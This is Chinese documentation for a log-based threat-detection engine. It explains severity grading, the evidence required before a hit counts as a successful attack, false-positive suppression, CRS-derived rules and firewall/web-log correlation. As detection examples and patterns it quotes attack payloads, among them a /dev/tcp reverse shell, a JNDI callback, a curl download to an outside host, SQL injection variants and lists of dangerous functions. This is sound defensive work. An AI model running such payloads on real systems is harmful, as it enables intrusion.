# 检测与研判

[← 返回 README](../README.md)

威胁等级如何判定、如何排除“表面成功”、威胁评分与安全评估。

## 威胁等级判定

一条命中从产生到入库会经过多个环节（特征规则、设备告警、资产漏洞关联、响应复核），每个环节都可能影响等级。为避免「各环节各自加减」导致同类事件等级不一致，最终等级统一由 `internal/risk` 裁决，规则里声明的 `severity` 只作为**建议值**。

**判定优先级（从高到低，后一步在前一步结果上收敛）**

1. **分类底线**：低于该分类最低等级的声明一律抬升。防止规则写错（把 SQL 注入写成 low）或自定义规则随手填 info 导致高危信号永久漏报。
2. **成功升级**：利用类攻击有**响应码之外的第二份证据**才升为「严重」（见下方“严重需要的证据”）；只有 2xx 响应的是「疑似成功」，最高高危。敏感文件可访问只到「高危」（证明暴露，不证明失陷）。
3. **严重级准入**：只有「有证据的成功利用」「失陷迹象（带外、恶意外连、远控、挖矿、主机事件）」以及日志直接证明的成功（如暴力破解后登录成功）可以达到严重。
4. **结果封顶**：已拦截 / 请求失败 / 后端异常的命中**最高只到高危**——没有成功就不构成严重。
5. **标签降级**：`tag_only` 规则只打标签，不超过低危，不参与告警分级；特征只出现在普通文字里时同样最高低危（见“研判复核”）；站点上从未出现过攻击针对的产品、请求也没有成功时最高低危（见[参数的正常取值与站点产品](self-learning.md#参数的正常取值与站点产品)）。
6. **复核回落**：命中被正常响应基线复核为「未成功」时，等级回落到高危封顶。

**严重需要的证据**

Web 日志只记录响应码和大小，看不到响应内容。应用忽略参数、单页应用、统一错误页都会返回 200，所以只凭 2xx 不能判定攻击得手。下列任意一项才算第二份证据（告警显示“成功（有证据）”）：

| 证据 | 说明 |
|---|---|
| 目标确有该漏洞 | 攻击利用的 CVE 与资产台账中未修复的漏洞精确匹配，且请求没有被拦截或失败 |
| 响应明显大于接口基线 | 接口的正常响应大小稳定，本次比正常多出至少一半、4 个标准差和 512 字节 |
| 脚本确实发生交互 | WebShell 类命中：POST 提交、带命令参数或执行上传目录中的脚本，已学到站点首页，且响应不同于首页 |
| 服务器确认创建了文件 | PUT 上传脚本返回 201 / 204 |
| 安全设备放行时的判断 | 设备看到了完整流量，放行且自身判定为严重 |

没有这些证据的盲打类攻击（Log4j、SSRF 等）最高高危；如果 DNS 日志出现带外回连，带外探测本身就是严重。

升级到该版本时，待处理事件中只凭响应码判为严重的（失陷迹象类除外）会调整为高危并写入处置记录；出现有证据的告警时自动升回。已关闭的事件不变。

**分类底线（节选）**

| 底线 | 分类 |
|---|---|
| 严重 | 带外探测（DNSLog 回连，漏洞已被触发的直接证据） |
| 高危 | SQL 注入、命令/代码执行、表达式注入、反序列化、WebShell、已知漏洞利用、目录穿越/文件包含、XXE、SSRF、恶意外连、恶意软件/远控、挖矿 |
| 中危 | XSS、敏感文件探测、管理后台探测、暴力破解、账号与权限、主机安全事件、CC/洪水攻击、可疑外连、DNS 隧道、攻击后回连（服务器高危、载荷中的回连地址严重，见下方“防火墙与 Web 日志联动”） |
| 低危 | 扫描器、网络空间测绘、目录扫描、端口扫描、主机探测、高危服务探测、IoT 僵尸网络、自动化工具、协议异常、DGA/动态域名、威胁情报、IP 伪造 |

扫描器类保持低危，避免互联网背景扫描抬高整体风险；`高风险端口探测` 同样只到低危（是否告警由 `exposure` 决定）。

**各等级的处理流程与边界**

| 等级 | 告警与推送 | 事件处置时限 | 失陷研判 | 典型边界 |
|---|---|---|---|---|
| 严重 | 默认推送；进入 P0 处置建议 | 1 小时（核心资产不变） | 计入高置信失陷 | 仅在有证据的成功利用或失陷迹象时出现；**已拦截的利用尝试不会达到严重** |
| 高危 | 默认推送 | 4 小时（核心资产按严重） | 疑似成功按中置信失陷统计 | 只有 2xx 响应的疑似成功、已拦截的已知漏洞利用、扫描器批量命中、暴力破解成功前的攻击 |
| 中危 | 不推送（按机器人配置） | 24 小时 | 仅作为线索 | 放行的端口探测、单次可疑外连（心跳）、敏感文件探测未取到内容 |
| 低危 | 只记录 | 72 小时 | 否 | 已拦截的扫描、高危端口探测、标签类观察 |
| 信息 | 只记录 / 只打标签 | 7 天 | 否 | `tag_only` 规则、空 UA 等弱特征 |

**误报与异常防护**

- **规则加载即校验**：`severity` 拼写错误直接启动失败；低于分类底线的声明会被纠正并打印日志；`tag_only` 规则不生成告警，不按底线抬升，最高按低危。
- **响应复核**：攻击请求的响应大小与该接口正常基线一致（变异系数 ≤10%、偏差 ≤5%），或与 3 个以上探测路径大小相同时，改判为「未成功」，最高高危（接口真实存在时，盲注成功的页面大小也可能不变）。与站点首页大小相同的，说明路径不存在、返回的是兜底页面，载荷没有到达应用，最高中危：扫描器对单页应用打一整套漏洞载荷时不会再刷出成片的高危。基线随快照保存，重启后不需要重新学习。
- **资产关联不越权**：目标确有针对性的未修复漏洞时，未拦截的命中按成功处理；已拦截的仍只到高危。
- **严重级佐证**：攻击源要达到「严重」，必须出现过严重告警（严重告警本身要求成功证据）或失陷迹象。扫描器把各类漏洞载荷都试一遍、全部没有成功时，按攻击类型累加的评分会顶到 100，等级仍按高危封顶。疑似失陷资产同样只把带证据的成功算作高置信。
- **设备告警**：按设备自身等级映射；无法识别时按高危（设备已判定为威胁），已拦截的封顶高危。
- **可观测**：`netsa_severity_adjusted_total{from,to}` 统计等级被自动调整的次数——持续出现 `critical→high` 说明规则把未成功的利用写成了严重；`GET /api/rules/stats` 给出每条规则的命中次数，长期 0 命中的规则需核对是否误配（分类拼写错误时启动日志也会列出）。
- **暴露面与探测分级解耦**：后台/端口「探测」按低危记录，是否真正暴露由响应状态判定——`2xx/3xx` 的 `/admin`、`/manage`、`/dashboard` 等通用后台入口会作为「管理后台/运维入口对外暴露」进入安全评估（中危），不会因为降低探测等级而漏掉真实暴露面。

## 研判复核：用证据排除“表面成功”

“放行”“返回 200”“失败后登录成功”只是表象，不能直接等同于攻击到达或得手。下列复核自动进行，无需配置：

| 场景 | 只看表象的误判 | 复核依据 | 处理 |
|---|---|---|---|
| 防火墙放行的端口探测 | 未映射端口被宽泛策略放行（如 untrust → untrust）也记中危 | 会话证据：安全域、DNAT 后地址、应答包数（见[会话证据研判](log-sources.md#未做-dnat-映射的端口探测)） | 未到达服务的只打标签 |
| 攻击面 “高危服务对公网开放” | 同上，未映射端口被登记为对外服务并扣分 | 同一份会话证据 | 不登记、不扣分；有证据到达的即使未登记映射也计入 |
| 外连威胁情报地址 | 放行即判“已失陷” | 会话结束时对端是否应答 | 无应答：连接未建立，高危（与被拦截同级）；有应答：严重，注明连接已建立 |
| 威胁情报来源 | 情报命中即高危 | 首次流量是否被拦截 / 未到达服务 | 拦截或未到达时按中危，后续真实攻击照常抬升 |
| 认证日志 “暴力破解成功” | 失败 5 次后任一账号登录成功即严重（用户自己输错、NAT 出口多人共用都会触发） | 是否已构成暴力破解 / 喷洒，成功的账号是否被尝试过 | 两者都满足才判定 |
| 防火墙日志的“端口暴力破解” | 对大量主机各连几次，累计次数就够阈值（互联网背景扫描） | 是否反复连接同一主机的同一端口（`brute_conns`）；防火墙日志只有连接次数，会话证据表明到达了服务才按高危，否则中危 | 横向扫描不判暴力破解 |
| 外部来源批量探测同一端口 | 每次探测都按中危，互联网背景扫描撑满事件列表 | 同一来源在窗口内探测 5 台以上主机的该端口，且没有到达服务的证据、端口也未登记对外发布 | 单次探测按低危；外部来源的主机探测按低危、端口扫描低一级，内网来源（横向移动）不降 |
| 认证暴力破解 / 密码喷洒 | 办公出口 NAT、跳板机后多人各输错几次即凑够阈值 | 同一来源有 3 个以上账号正常登录 | 降为中危并注明“疑似共享出口” |
| Web 登录 “疑似破解成功” | 攻击 A 接口后，正常登录 B 接口被当成破解成功 | 成功响应是否出现在被反复提交的同一接口 | 不同接口不判定 |
| 普通文字中的特征 | 搜索“how to use <script> tag”、帖子标题“why does eval() fail”判为注入或代码执行 | 所在参数值去掉不带属性的标签、无参数的函数名后，只剩两个以上的词，没有任何代码符号 | 最高低危。`<script>alert(1)</script>`、`system('id')`、`phpinfo()` 不受影响 |
| 路径中的相对引用 | `/assets/../assets/app.js` 判为目录穿越 | `../` 未编码、只在路径里、解析后没有越出站点根目录 | 不告警；解析后指向敏感文件的由其他规则判断 |
| 敏感文件 / WebShell 返回 200 | 单页应用、统一错误页对任何路径都返回首页 | 响应大小与首页正常响应一致，或 3 个以上不同探测路径大小完全相同（自动学习；`//.env`、`/./.env`、`/.env;.css`、`/%2e%65nv` 等绕过 WAF 的写法按同一路径计） | 判定为兜底页面，不报敏感资源暴露，不判定成功 |
| 接口遍历 / 批量爬取 | 兜底页、统一的“无权限”提示返回 200 | 不同 ID 的响应大小是否各不相同 | 完全相同时不告警 |
| 大量 5xx（异常请求引发服务端错误） | 后端故障时每个访问多的用户都被告警 | 同一站点是否有 10 个以上来源同时收到 5xx | 视为服务故障，不告警 |
| 资产存在被利用的 CVE | 利用请求返回 404 也升为“疑似成功 / 严重” | 响应是否表明失败 | 失败的请求不改判为成功 |
| 搜索框、标题里的 SQL 写法 | 搜索“select 用法 from 入门教程”判为 SQL 注入 | 语法分析不构成注入，且该参数平时就填写普通文字（自动学习） | 最高低危，仍生成告警。两个依据缺一个都不降 |
| 针对站点没有的产品的探测 | 只有 Java 的站点上 ThinkPHP、PHPUnit 的利用请求返回 404，也按高危 | 站点有足够多的正常访问，从未出现过该产品或开发语言的访问痕迹（自动学习），请求也没有成功 | 最高低危。成功的请求不做这个判断 |

## 语法分析（libinjection）

正则只能说明“出现了某些写法”。查询参数中的 SQL 注入、XSS 命中会再交给 [libinjection](https://github.com/corazawaf/libinjection-go)（与 ModSecurity CRS 942100 / 941100 使用的是同一个库）按 SQL 词法、HTML 解析复核，两者相互独立：

| 规则 | 语法分析 | 处理 |
|---|---|---|
| 命中 | 构成注入 | 证据中注明“语法分析确认”和 libinjection 指纹，误报的可能很小 |
| 命中 | 不构成注入 | 记录下来交给自学习：该参数平时就填写普通文字时降为低危，否则照常 |
| 没有命中 | 构成 SQL 注入 | 生成 `sqli-syntax`（SQL注入（语法分析）），补上 `1' div 0 --`、`1)) or ((1`、`admin' or 1#`、`' \|\| '` 这类正则没有写到的变形 |

- 只看含有引号、括号、注释、分号的查询参数，正常请求基本不需要分析，检测耗时几乎不变。
- 只由单词和括号组成的指纹（如“Left (WA, RR)”“while (foo) is bar”里恰好是 SQL 函数名的单词）不认定为注入；XSS 只复核不单独告警（libinjection 见到 `<script` 就判为 XSS，普通文字里提到标签也会命中）。

## 改编自 OWASP CRS 的规则

用 Coraza + OWASP CRS v4.25 与本引擎对比了内置评测样本和 CRS 自带的 2333 条回归样本（只取日志里看得到的 URI 与 UA）：

| | 内置攻击样本检出 | 内置正常样本告警 | 单条耗时 |
|---|---|---|---|
| Coraza + CRS（偏执等级 1） | 72.8% | 12%（提到 `<script>`、`eval()` 的普通文字，`/assets/../app.js` 这类相对路径） | 约 1ms |
| Coraza + CRS（偏执等级 2） | 82.7% | 29% | 约 1.6ms |
| 本引擎 | 100% | 6%，全部不高于低危 | 约 3.5µs |

CRS 依赖完整的请求头与请求体，只看日志时误报偏高，且每条约慢 300 倍、需要引入 20 多个依赖，因此不整体引入，只把它覆盖到、本引擎原来没有、在两组正常样本上没有误报的部分改写成原生规则（Apache-2.0，见 [NOTICE](../NOTICE)）：

| 规则 | 来源 | 内容 |
|---|---|---|
| `cmd-inject-ext` | CRS 932235 / 932260 | 命令分隔符后的 awk、sed、base64、crontab、socat、sudo 等命令；find、cd、head 这类常见单词只在跟着绝对路径时算 |
| `cmd-windows`、`cmd-win-for` | CRS 932140、PowerShell 命令表 | `for /f %i in (...) do`、`iex(`、`Invoke-WebRequest`、`Net.WebClient`、certutil / mshta / regsvr32 等系统程序的滥用 |
| `code-php-ext`、`code-php-cb`、`code-php-var`、`code-php-wrap` | CRS 933150 / 933180 / 933210 | 带括号调用的 PHP 危险函数（fsockopen、file_get_contents、array_map、unserialize……），`$a(1)`、`(system)('id')` 这类变量函数调用；去掉了 copy、glob、rename 这类普通单词 |
| `code-java-class` | CRS 944130 | Java 危险类名（java.io.ObjectInputStream、javax.naming.InitialContext、org.apache.commons……），去掉了 java.lang.String 这类文档里也常见的类 |
| `code-node` | CRS 934100 | `require('child_process')`、`process.mainModule`、node-serialize 的 `_$$ND_FUNC$$_` |
| `sqli-pgcast` | CRS 942550 / 942151 | PostgreSQL 类型转换注入 `'::int`、`'{...}'::jsonb` |
| `ssrf-internal`（扩充） | CRS 934190 | `localhost4`、`ip6-localhost`、`0x7f000001`、`0177.0.0.1` 等 localhost 写法 |

加上这些规则后，CRS 回归样本中本引擎的检出从 410 条提高到 585 条；CRS 的 536 条反例上新增的 8 条告警都是 `;vim -c:!pwd` 这类真实的命令执行载荷（反例只表示由另一条 CRS 规则负责）。用真实环境一天的 1.7 万条 nginx 日志核对，新规则没有任何命中。

## 国产 OA、中间件漏洞接口签名

内置 261 条签名，覆盖致远、泛微、用友、通达、蓝凌、万户、金和、宏景、红帆 OA，帆软、Smartbi、亿赛通、畅捷通 T+、若依、JeecgBoot、Nacos、XXL-JOB、ThinkPHP、织梦、骑士等 CMS，APISIX、Nginx UI，以及深信服、天融信、奇安信、锐捷、H3C、海康威视、大华等设备，共 43 个国产产品。签名由 `tools/vulnpaths` 从 [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)（MIT 许可，见 [NOTICE](../NOTICE)）中提取，另有少量人工补充。

签名只有路径与查询参数名（以及 `method=`、`action=` 这类选择功能的参数值），不含载荷：日志看不到请求体，攻击者换载荷也能认出。

| 情况 | 分类 | 等级 |
|---|---|---|
| 请求是某个产品的漏洞接口，且带有注入、穿越、命令执行等载荷 | 已知漏洞利用，名称注明产品与 CVE / CNVD 编号（如“万户OA 任意文件读取漏洞利用”） | 按漏洞等级，高危为主 |
| 只访问了漏洞接口（上传、反序列化的载荷在请求体里，或用 GET 确认接口是否存在） | 漏洞接口探测 | 中危（中危漏洞为低危） |
| 站点上从未出现过该产品、请求也没有成功 | 同上 | 最高低危（产品不适用） |
| 接口是站点正常业务在用的（自动学习） | 漏洞接口探测 | 最高低危，见[业务接口学习](self-learning.md#参数的正常取值与站点产品) |

- 签名在生成时排除了会被正常访问撞上的请求：产品首页（`/seeyon/main.do`）、登录接口、上传后验证文件的请求，以及 `/download.do`、`/search.php` 这类其他系统也常用的接口名。
- 原有 `cve-middleware` 规则中按整个产品目录（`/yyoa/`、`/defaultroot/`）、正常业务接口（`/seeyon/webmail.do`、`/ispirit/interface`、`/general/login_code.php`）判为高危的部分已移除，由签名库更精确地判断：跑着这些 OA 的站点，正常访问不再一律高危。
- 生成时同时输出每条签名对应的原始模板请求（保留大小写与编码），测试保证它们都能被认出；在演示日志（2.76 万条）与 CRS 回归样本（2333 条）上没有命中。
- 匹配按路径中的每一段查表，不命中时每条请求约 100ns。

更新签名（需要 nuclei-templates 的本地副本，只读取其中的 YAML）：

## nginx 系产品（Tengine、OpenResty、APISIX、Nginx UI）

| 规则 | 识别的请求 | 等级 |
|---|---|---|
| 目录穿越（alias 缺少斜杠） | `/static../etc/passwd`：`location /static` 不以 `/` 结尾而 `alias` 以 `/` 结尾时会跳出 alias 目录。此前 `xxx../` 这样的段被当作普通目录名 | 高危 |
| 调试/信息泄露接口探测 | nginx `stub_status`（`/nginx_status`、`/ngx_status`、`/basic_status`）、Tengine 的上游健康检查 `/check_status` 与 `/req_status`、`/upstream_status`、nginx-module-vts 的 `/status/format/json`、APISIX 的 `/apisix/prometheus/metrics` | 中危；能访问时计入暴露面 |
| 管理后台探测 | APISIX Admin API（`/apisix/admin/…`） | 低危 |
| APISIX 默认管理密钥利用（CVE-2020-13945） | 请求中出现默认 `admin_key`（`edd1c9f0…`） | 高危 |
| APISIX、Nginx UI 漏洞接口 | 签名库新增 APISIX 的 `routes`（CVE-2020-13945）、`migrate/export`（CVE-2021-45232）、`batch-requests`（CVE-2022-24112），Nginx UI 的 `/api/backup`（CVE-2026-27944）、`/mcp_message`（CVE-2026-33032）、`/api/install`（CVE-2026-42221），共 261 条 | 同[国产 OA、中间件漏洞接口签名](#国产-oa中间件漏洞接口签名) |
| Lua代码注入 | `os.execute(`、`io.popen(`、`loadstring(`、`ngx.pipe.spawn(`、`require('os')` 等 OpenResty / APISIX 利用中的 Lua 代码 | 高危 |
| 超多参数绕过WAF（CVE-2018-9230） | 查询串超过 100 个参数：OpenResty 的 `ngx.req.get_uri_args` 默认只读前 100 个，基于它的 Lua WAF 看不到之后的载荷 | 中危 |
| Web服务器解析漏洞、空字节截断（原有） | `/upload/1.jpg/.php`（PHP-FPM `cgi.fix_pathinfo`）、`/1.gif%20%00.php`（CVE-2013-4547） | 高危 |

## 防火墙与 Web 日志联动：被攻击后回连

Web 日志只能看到请求，看不到服务器之后做了什么；防火墙日志能看到内网主机的出站连接。两者关联可以发现攻击已经得手：

| 情况 | 等级 | 说明 |
|---|---|---|
| 内网主机连接**攻击载荷中写明的公网地址**（`bash -i >& /dev/tcp/1.2.3.4/4444`、`${jndi:ldap://1.2.3.4/a}`、`curl http://1.2.3.4/x.sh`） | 严重（有证据） | 载荷被执行了 |
| 对外提供服务的内网主机（接收过外部访问、DNAT 的目标）在利用尝试之后**连接攻击者本身** | 高危 | 反弹 Shell、SSRF 回连的常见形态 |
| 其他内网主机连接攻击者 | 中危 | 办公终端的 P2P 下载、视频加速也会连接陌生地址，只提示，不列为失陷 |

- 关联窗口为攻击之后 2 小时（允许 2 分钟的时钟误差）；连接被拦截的最高高危（载荷执行了但没有连出去）。
- 排除正常业务：攻击发生之前就有内网主机连接过的地址（公共 DNS、CDN、合作方接口）、本单位自己对外发布服务的公网地址（内部用户经出口 NAT 访问自己网站时，Web 日志里的来源就是这个地址）、常见公共 DNS 不关联。
- 高危以上的回连会列为疑似失陷主机，并自动确认对应的攻击来源（见[自学习](self-learning.md)）。分类为“攻击后回连”，ATT&CK T1071 / T1059。

## 威胁评分模型

- 按攻击分类累计：分类权重（低 5 / 中 12 / 高 25 / 严重 45）×（1 + log2(次数)/3，最多 2 倍），侦察类 ×0.6
- 疑似攻击成功 +20；跨越多个攻击阶段每多一个阶段 +10；命中威胁情报 +30；上限 100
- 等级：≥80 严重、≥50 高危、≥25 中危、>0 低危；**攻击源等级不低于其触发过的最高告警等级**（评分同步抬升到该等级下限），告警事件中出现高危的 IP 必然计入“高危以上攻击源”。严重级还需佐证：没有成功命中、也没有失陷迹象分类时，单条严重告警只按高危封顶
- 威胁指数：最近 60 分钟按严重程度加权的攻击量，经指数饱和映射到 0-100
- 两类等级的区别：**告警 / 攻击事件**按单次攻击的规则等级统计（总览“攻击事件”下方的严重 / 高危 / 中危）；**攻击源**按 IP 的综合威胁等级统计（总览“高危以上攻击源”）。同时触发高危与严重告警的 IP 计为严重攻击源。

## 安全评估与失陷研判

大屏 **安全评估** 页面综合全部数据给出当前防护状况的评估与处置建议：

| 维度 | 权重 | 评估内容 |
| --- | --- | --- |
| 失陷风险 | 25 | 疑似失陷资产（攻击成功研判、外连恶意地址、被攻击后回连攻击者、设备报出的内网恶意软件），按置信度扣分 |
| 暴露面 | 20 | 敏感资源可公开访问（源码仓库、密钥、备份、配置、调试接口、管理后台）、高危服务对公网开放 |
| Web 防护 | 15 | 漏洞利用类请求的拦截率、攻击成功的 Web 资产 |
| 凭证安全 | 10 | 暴力破解来源与疑似破解成功 |
| 边界防护 | 10 | 对公网开放的高危服务、端口扫描来源（未接入防火墙日志时不参与评分） |
| 威胁活跃度 | 10 | 近 60 分钟威胁指数、仍在活动的高危攻击源、情报命中 |
| 日志与检测覆盖 | 10 | Web / 防火墙日志接入、解析成功率、威胁情报、精确定位、告警推送、长期归档、平台访问加固 |

- **总评**：按权重加权平均，存在高置信失陷时总评不高于 35 分（E 危险），存在疑似失陷或严重暴露面时不高于 59 分。
- **处置建议**：P0 紧急（应急处置失陷资产、删除泄露的敏感资源、关闭对公网开放的严重风险服务）、P1 高（核查疑似成功、封禁活跃的高危攻击源、加固登录口、提升 WAF 拦截能力）、P2 中、P3 低（补齐检测覆盖、减少指纹暴露），每条附操作步骤，点击即可查看相关告警、攻击源或资产。
- **失陷研判**：同一资产的多种成功迹象合并展示，附攻击来源 / 外连地址与处置建议。
- **外连恶意地址检测**：配置 `intel.blocklists` 后，防火墙日志中内网主机（或本机出站流量）连接列表中地址的行为会产生“外连威胁情报地址（疑似失陷）”告警，并推送到告警机器人、写入归档。演示环境自带一份演示情报（[configs/demo-intel.txt](../configs/demo-intel.txt)），模拟日志中的 10.0.0.31 会周期性外连。
- **ATT&CK 矩阵**：各攻击类型映射到 MITRE ATT&CK 技术（如 SQL 注入 → T1190、WebShell → T1505.003、暴力破解 → T1110、外连 → T1071），矩阵按命中量着色，点击技术查看对应告警；IP 溯源详情中列出该攻击源使用过的技术。
- **研判准确性**：Log4j / SSRF / XXE / 反序列化等盲打类攻击无法从响应码判断是否成功，返回 2xx 时研判为“未拦截”而非“疑似成功”；对 SQL 注入、目录穿越、已知漏洞利用等，若攻击请求的响应与该接口正常访问时的响应大小一致（接口响应大小稳定且偏差在 5% 以内），说明返回的仍是正常页面，改判为“未拦截”。内网主机访问公网的出站流量不做扫描 / 洪泛 / 暴力破解判定，也不计入服务暴露面，避免把正常上网当成攻击。
- **评分趋势**：每小时记录一次安全评分（随快照保存，保留 30 天），展示整改效果。
- **安全日报**：每天 `alert.report_time`（默认 09:00，`off` 关闭）向勾选了“接收每日安全日报”的机器人推送安全评分与结论、近 24 小时攻击量及环比、活动 / 新增 / 高危攻击源、疑似失陷资产、主要攻击类型与攻击源、P0 / P1 优先处置事项；在“告警推送”页可对任一机器人点击“发送日报”立即发送。
- **行为检测**：分布式暴力破解（`dist_window` 内同一登录接口失败登录 ≥ `dist_brute_logins` 次且来自 ≥ `dist_brute_ips` 个来源，401 / 403 / 429 计为失败）、接口遍历 / 批量爬取（`enum_window` 内同一来源对同一接口请求 ≥ `enum_ids` 个不同 ID 并成功返回，涉及用户 / 订单 / 账户等接口为高危，搜索引擎爬虫除外，归入“数据窃取”攻击阶段与 ATT&CK 收集战术）、周期性外连（`beacon_conns` 次连接）。
- **目录扫描与漏洞扫描**：
  - **目录/文件枚举扫描**（中危）：同一来源 `web_window` 内 404 达到 `scan_404`（40）次、不同路径达到 `scan_paths`（30）个。对不存在的路径返回首页（200）的站点（单页应用、统一兜底页），与首页（`/`）常见响应大小相同的 200 按“未找到”计入；首页的大小自动学习（至少 5 次、占首页响应 20% 以上的大小），压缩与未压缩的大小都会记下。
  - **自动化漏洞扫描**（中危，`bhv-vulnscan`）：同一来源 `web_window` 内带攻击载荷的请求达到 10 次、涉及 3 类以上攻击（注入、XSS、穿越、命令执行、表达式注入、SSRF、敏感文件、漏洞接口等），按整段扫描识别，并从 UA、带外回连域名、工具文件名中认出工具。nuclei、xray 这类工具换成浏览器 UA 后仍能识别。
  - **扫描器特征**（`scan-artifact`）：参数、路径中的 OAST / DNSLog 回连域名，与工具探测时使用的固定文件名。
  - 授权的漏洞扫描器（自有安全团队、外包渗透）加入 `detect.whitelist`，只统计流量、不做检测。
- **CC 与 DDoS**：
  - **单源 CC**（高危）：同一来源 `web_window`（默认 1 分钟）内请求达到 `cc_requests`（600）次。
  - **分布式 CC**（高危）：按站点汇总。`web_window` 内站点请求量达到 `dist_cc_requests`（3000）且为平时的 5 倍以上，一半以上集中在同一路径，且至少 `dist_cc_ips`（20）个来源各请求该路径 `dist_cc_ip_requests`（30）次以上（占其请求的大部分）。正常的访问高峰（访客请求各种页面）、App 低频轮询都不满足“集中刷同一路径”；平时水平是每个窗口请求量的滑动平均，突增窗口不计入，缓慢上升的业务高峰会被跟上。启动初期没有平时水平时按 2 倍的 `dist_cc_requests` 判断。参与的来源各告警一次（每次最多 500 个），证据注明站点、路径与平时的请求量。
  - **慢请求 / 超时攻击**：见下文。nginx 错误日志中 `limit_req` / `limit_conn` 拒绝的请求也记为 CC 攻击（见[日志接入](log-sources.md#错误日志与-waf-判定)）。
  - **单源洪泛**（高危）：同一来源 `fw_window`（默认 5 分钟）内产生 `flood_events`（5000）条防火墙事件，且集中打向少数目标；分散到大量端口或主机的是扫描。
  - **多源 DDoS**：按防火墙日志的目的地址与端口汇总。`fw_window` 内事件达到 `ddos_events`（20000）且为该目标平时的 5 倍以上，来自 `ddos_sources`（200）个以上来源，且不是主要来自一个来源。多数连接被拒绝或没有应答（SYN 洪泛、已被设备拦截）时为高危，否则中危（可能是业务量突增，待核实）。繁忙的对外服务平时就有大量来源，所以没有平时水平时只在达到 10 倍 `ddos_events` 时判断。触发判定的来源与事件较多（10 条以上）的参与者各告警一次，每次最多 50 个，伪造源地址时不会刷出成千上万条告警。
  - 带宽被打满的流量型 DDoS 往往到不了防火墙与 nginx 的日志，需要运营商或云厂商的抗 D 服务、NetFlow 发现；华为、FortiGate 等设备自身报出的 DoS / Flood 威胁按设备告警接入。
- **行为检测的误报控制**（来自生产环境的反馈）：
  - **Web 登录暴力破解**只统计登录类接口与 HTTP Basic 认证（日志记录了 `$remote_user`）的 401。App、单页应用带着过期令牌启动或轮询时，十几个业务接口会同时返回 401，那是会话过期。
  - **流量洪泛**只针对集中打向少数目标的连接；分散到大量端口或主机的高速扫描只按端口扫描、主机扫描告警，不再判为高危的洪泛。
  - **周期性外连**：定时 ping 外部地址（ICMP）多是链路监控，判为低危；已有 2 台以上内网主机以同样规律连接同一地址时，之后的主机判为低危（多为统一部署的客户端、监控或更新代理）。
  - **非 HTTP 请求**：TLS 握手、Oracle TNS 等二进制协议发往 HTTP 端口时只判为协议探测（低危），其中的 `\x00` 不再按“空字节截断”判为高危。
  - **远程文件包含**：参数里的地址与请求的站点相同或属于同一主域名时不告警，如 pdf.js 的 `viewer.html?file=https://本站/…pdf`。
  - **兜底页面**：要等 3 个不同探测路径返回同样大小才能认出；认出后，扫描开头已记为“疑似攻击成功”的同大小记录随即撤销，不再列为疑似失陷资产。
  - **误报处置联动**：把某个来源的事件标为误报或忽略时，同时撤销该来源名下没有证据的“疑似攻击成功”记录（如授权的漏洞扫描），有证据的保留。
- **慢请求 / 超时攻击**（中危）：`timeout_window`（默认 10 分钟）内同一来源收到 504 / 408、或请求耗时超过 `slow_request`（默认 10 秒，日志带 `$request_time` 时生效）的响应达到 `timeout_requests`（默认 20）次，超时占其请求的 30% 以上，且超时比例是同一站点其他访客的 4 倍以上。慢速攻击每分钟只有几次请求，按 1 分钟窗口的 5xx 统计发现不了；后端整体故障时所有访客都超时，不判定为攻击。
- **疑似破坏性攻击**（高危，ATT&CK T1485 / T1499）：一条此前正常服务过 3 个以上访客的业务路径，开始对 3 个以上访客（其中可疑来源以外的至少 2 个）返回 404 / 410 / 5xx，且之前有可疑来源：触发了超时攻击，或在攻击规则命中后对该路径（或其上级）写操作成功（DELETE / PUT / PATCH / POST）。告警落在可疑来源下一次出现的请求上。只有可疑来源自己收到 404（例如被 WAF 拦截）、或没有可疑来源的路径失效（发布、下线），都不告警。
- **内部来源**：私有地址、配置或自动学习的内网网段，以及防火墙日志中来源安全域属于内部（trust、dmz、inside、内网等）的地址都按内部来源处理。内部来源被策略放行的连接不按连接次数判定暴力破解（应用服务器的连接池、定时任务连数据库是业务访问），被拒绝的照常统计。
- 总览顶部的 **态势研判** 条给出一句话结论与近 1 小时攻击量环比、新增攻击源、活跃高危攻击源、疑似成功攻击、疑似失陷资产与安全评分，均可点击下钻。
